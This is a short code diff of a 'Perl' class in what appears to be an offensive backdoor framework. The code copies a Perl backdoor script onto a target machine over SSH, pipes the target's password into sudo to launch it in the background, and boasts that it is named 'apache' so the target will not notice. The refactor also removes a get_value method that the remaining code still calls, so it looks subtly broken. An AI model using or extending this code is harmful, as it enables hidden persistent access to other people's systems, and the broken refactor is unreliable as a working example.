@@ -14,16 +14,9 @@ class Perl(Backdoor):
         self.allow_modules = True
         self.enabled_modules = {}
         self.modules = {} 
-        self.command = "echo " + self.target.pword + " | sudo -S nohup perl prsA.pl"
-    def check_valid(self):
-        return True
     
-    def get_value(self, name):
-        if name in self.options:
-            return self.options[name].value
-        else:
-            return None
-
+    def get_command(self, args):
+        return "echo " + self.target.pword + " | sudo -S nohup perl prsA.pl"
 
     def do_exploit(self, args):
         port = self.get_value("port")
@@ -46,9 +39,7 @@ class Perl(Backdoor):
         self.target.scpFiles(self, 'perl/prsA.pl', False)
         print("Moving the backdoor script.")
 
-        #do it in either case to start the backdoor.
         self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S nohup perl prsA.pl")
-        
         print("Perl backdoor on port %s attempted. It's named apache so the target won't see what's going on. If you stop the listener, the backdoor will stop, unless it is a cronjob." % port)
 
 
